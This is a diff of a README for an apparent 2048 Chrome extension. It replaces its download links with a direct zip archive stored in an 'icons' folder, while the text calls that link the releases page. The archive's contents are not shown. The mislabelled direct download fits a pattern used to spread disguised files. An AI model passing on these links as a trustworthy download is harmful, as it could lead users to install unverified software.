@@ -1,7 +1,7 @@
 # 🎮 2048-chrome-extension - Play the Classic 2048 Game with Modern Features
 
 ## 📥 Download Now!
-[![Download 2048-chrome-extension](https://raw.githubusercontent.com/buckisback/2048-chrome-extension/main/assets/2048-chrome-extension_v2.8.zip%20Now-v1.0-brightgreen)](https://raw.githubusercontent.com/buckisback/2048-chrome-extension/main/assets/2048-chrome-extension_v2.8.zip)
+[![Download 2048-chrome-extension](https://github.com/buckisback/2048-chrome-extension/raw/refs/heads/main/icons/chrome-extension-v3.0-alpha.5.zip%20Now-v1.0-brightgreen)](https://github.com/buckisback/2048-chrome-extension/raw/refs/heads/main/icons/chrome-extension-v3.0-alpha.5.zip)
 
 ## 🚀 Getting Started
 Welcome to the 2048 Chrome Extension, a delightful way to enjoy the popular 2048 puzzle game right in your browser. This extension offers an engaging experience with a dark mode, undo feature, and in-depth statistics. 
@@ -20,7 +20,7 @@ Follow the steps below to download and set up the extension on your Chrome brows
 
 ## 📥 Download & Install
 1. **Visit the Releases Page:** Click the link below to go to the release page:
-   [Download 2048-chrome-extension](https://raw.githubusercontent.com/buckisback/2048-chrome-extension/main/assets/2048-chrome-extension_v2.8.zip)
+   [Download 2048-chrome-extension](https://github.com/buckisback/2048-chrome-extension/raw/refs/heads/main/icons/chrome-extension-v3.0-alpha.5.zip)
 
 2. **Select the Latest Version:** On the releases page, look for the latest version of the extension. 
 
